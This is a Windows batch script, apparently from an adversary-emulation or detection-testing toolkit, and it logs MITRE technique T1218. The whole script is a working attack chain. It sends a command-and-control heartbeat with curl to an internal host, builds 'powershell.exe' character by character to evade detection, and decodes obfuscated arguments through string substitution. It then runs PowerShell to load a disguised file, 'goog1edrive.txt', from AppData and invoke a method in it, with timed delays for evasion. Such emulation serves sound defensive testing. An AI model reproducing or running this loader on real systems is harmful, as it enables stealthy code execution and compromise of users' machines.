@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET acxqll=%APPDATA%\8817\abcea5bb
SET zqwwmd=https://10.0.0.49
SET ghxjkw=https://10.0.0.49/stage/2/icon.png?8817-7
SET xbxsnp=ITZEL-S2BO
SET kqwefj=7
SET jvnmsw=goog1edrive.txt
SET vrvtvw=8817
SET logfile=%APPDATA%\!kqwefj!\macula-simulations.log

REM Initial delay
echo [!DATE! !TIME!][DEBUG][!xbxsnp!]: delay_start>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!xbxsnp!]: delay_complete>> "!logfile!" 2>nul

REM C2 Heartbeat (not obfuscated)
echo [!DATE! !TIME!][DEBUG][!xbxsnp!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!ghxjkw!"
echo [!DATE! !TIME!][DEBUG][!xbxsnp!]: heartbeat_complete>> "!logfile!" 2>nul

REM Delay between operations
ping -n 7 127.0.0.1 >nul

REM Build LOLBin path using character-by-character obfuscation
SET c1=p
SET c2=o
SET c3=w
SET c4=e
SET c5=r
SET c6=s
SET c7=h
SET c8=e
SET c9=l
SET c10=l
SET c11=.
SET c12=e
SET c13=x
SET c14=e
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%%c12%%c13%%c14%

REM Build command parts with string substitution
SET enc1=ecoj^ -ekypa eb^b^s vcomasna
SET cmd1=%enc1:eo=et%
SET cmd2=%cmd1:eky=pb%
SET cmd3=%cmd2:com=man%
SET cmd4=%cmd3:as=ds%
SET enc2=impxrj^ -nroodudqejl^ .^7UOtwlqfDvnqdukqRwrpr1^qx
SET cmd5=%enc2:xp=po%
SET cmd6=%cmd5:ro=rt%
SET cmd7=%cmd6:udq=-f%
SET cmd8=%cmd7:jl=le%
SET cmd9=%cmd8:UO=ti%
SET cmd10=%cmd9:wl=li%
SET cmd11=%cmd10:qf=Fu%
SET cmd12=%cmd11:nq=nc%
SET cmd13=%cmd12:du=ti%
SET cmd14=%cmd13:kw=on%
SET cmd15=%cmd14:Rw=s%
SET cmd16=%cmd15:wr=.%
SET cmd17=%cmd16:pr=ps%
SET cmd18=%cmd17:1=1%

REM Execute command
echo [!DATE! !TIME!][DEBUG][!xbxsnp!]: command_start>> "!logfile!" 2>nul
%lolbin% %cmd4% "%cmd18% !acxqll!\!jvnmsw!;[Program.Class]::Dale()"
echo [!DATE! !TIME!][DEBUG][!xbxsnp!]: command_end>> "!logfile!" 2>nul

REM TTP logging
SET res=1
SET err=
SET ttp_id=T1218
SET ttp_name=Signed Binary Proxy Execution
echo [%DATE% %TIME%][!xbxsnp!]: !kqwefj!-!vrvtvw!-!ttp_id!|!ttp_name!=!res!:!err!>> "!logfile!" 2>nul

REM Random delay before exit
SET /A rnd=!RANDOM! %% 15 + 5
timeout /t !rnd! /nobreak >nul
ENDLOCAL